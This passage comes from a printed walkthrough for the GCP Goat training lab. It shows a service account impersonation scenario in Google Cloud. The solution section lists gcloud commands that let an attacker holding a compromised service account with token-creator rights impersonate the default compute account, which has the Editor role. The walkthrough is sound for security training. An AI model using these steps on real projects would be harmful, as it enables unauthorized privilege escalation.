</code></pre>
<blockquote>
<p>replace the <code>project-id</code> with your project ID</p>
</blockquote>
<p>Next configure the <code>gcloud</code> to use the project by typing the below command in the shell </p>
<pre><code class="language-bash">gcloud config set project $PROJECT_ID
</code></pre>
<p>Next initialize the terraform by typing the below command in the shell </p>
<pre><code class="language-bash">terraform init
</code></pre>
<p>Next apply the terraform by typing the below command in the shell </p>
<pre><code class="language-bash">terraform apply -auto-approve -var project-id=$PROJECT_ID
</code></pre>
<p>Next output the service account key by typing the below command in the shell </p>
<pre><code class="language-bash">terraform output -raw sa-key &gt; creds.json
</code></pre>
<h2 id="scenario-info-5"><a class="header" href="#scenario-info-5">Scenario Info</a></h2>
<p>According to Google <a href="https://cloud.google.com/iam/docs/service-accounts">Documentation</a> </p>
<p><strong>A service account is a special kind of account used by an application or a virtual machine (VM) instance, not a person.</strong></p>
<p>One of the coolest feature of the service account is that it can be impersonated by any user/service account in the project if the user/service account has the <code>iam.serviceAccountTokenCreator</code> role in the project. In this scenario we are going to exploit this feature </p>
<p>Whenever we want to impersonate the service account we need to add the <code>iam.ServiceAccountTokenCreator</code> role to the user/service account , but keep in the mind if we add this role at the project level then the user/service account can impersonate any service account in the project. </p>
<p>In this scenario we are going to impersonate the <code>default-compute-engine</code> service account which has the <code>Editor</code> role in the project</p>
<h3 id="solution-4"><a class="header" href="#solution-4">Solution</a></h3>
<p>This scenario assumes that the attacker has already compromise the <code>service-account</code> which as the <code>iam.serviceAccountTokenCreator</code></p>
<p>Configure the <code>gcloud</code> to use the <code>service-account</code> by typing the below command in the shell </p>
<pre><code class="language-bash">gcloud auth activate-service-account --key-file=creds.json
</code></pre>
<p>Now try to list the buckets in the project by typing the below command in the shell </p>
<pre><code class="language-bash">gsutil ls
</code></pre>
<blockquote>
<p>You will get an error saying that you don't have permission to list the buckets</p>
</blockquote>
<p>Next we are trying to impersonate the default-compute-engine service account which has <code>Editor</code> permission in the project</p>
<p>Export the <code>default-compute-engine</code> service account email by typing the below command in the shell </p>
<pre><code class="language-bash">export SA_EMAIL=$(gcloud projects describe $PROJECT_ID --format=&quot;value(projectNumber)&quot;)-compute@developer.gserviceaccount.com
</code></pre>
<pre><code class="language-bash">gcloud config set auth/impersonate_service_account $SA_EMAIL
</code></pre>
<p>Now try to list the buckets in the project by typing the below command in the shell </p>
<pre><code class="language-bash">gsutil ls
</code></pre>
<p>This time you will be able to list the buckets in the project</p>
<p>Now as the attacker you can do anything in the project as the <code>default-compute-engine</code> service account</p>
<p>Next we are going to unset the impersonated service account by typing the below command in the shell </p>
<pre><code class="language-bash">gcloud config unset auth/impersonate_service_account
</code></pre>
<h3 id="clean-up-5"><a class="header" href="#clean-up-5">Clean up</a></h3>
<p>To clean up the <code>Scenario</code> type the below command in the <code>GCLOUD Shell</code></p>
<pre><code class="language-bash">terraform destroy -auto-approve -var project-id=$PROJECT_ID
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="wrapping-up"><a class="header" href="#wrapping-up">Wrapping up</a></h2>
<p>It's recommended to delete the project after you are done with the GCP Goat. You can do this by running the following command: </p>
<pre><code class="language-bash">export PROJECT_ID=&quot;project-id&quot;
</code></pre>
<pre><code class="language-bash">gcloud projects delete PROJECT_ID
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="contributing-to-the-gcp-goat"><a class="header" href="#contributing-to-the-gcp-goat">Contributing to the GCP GOAT</a></h2>
<p>Thanks for Showing Interest to Contribute to the <code>GCP-GOAT</code></p>
<p>Here are the few ways you can contribute</p>
<ul>
<li>Improving the Documentation</li>
<li>Adding More Scenarios to the GOAT</li>
<li>Improving the Application used in the Scenarios</li>
<li>Spreading the word with the community </li>
</ul>
<h3 id="in-order-to-contribute-to-the-gcp-goat-get-connected-to-the-author-via"><a class="header" href="#in-order-to-contribute-to-the-gcp-goat-get-connected-to-the-author-via">In order to contribute to the GCP-GOAT get connected to the author via</a></h3>
<ul>
<li><a href="https://twitter.com/joshva_jebaraj?lang=en">Twitter</a></li>
<li><a href="https://www.linkedin.com/in/joshua-jebaraj-b6a543160/">LinkedIn</a></li>
<li><a href="https://github.com/JOSHUAJEBARAJ">Github</a></li>
</ul>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">

            </nav>

        </div>

        <!-- Livereload script (if served using the cli tool) -->
        <script>
            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
            const socket = new WebSocket(wsAddress);
            socket.onmessage = function (event) {
                if (event.data === "reload") {
                    socket.close();
                    location.reload();
                }
            };

            window.onbeforeunload = function() {
                socket.close();
            }
        </script>



        <script>
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr.min.js"></script>
        <script src="mark.min.js"></script>
        <script src="searcher.js"></script>

        <script src="clipboard.min.js"></script>
        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS scripts -->

        <script>
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>

    </div>
    </body>
</html>
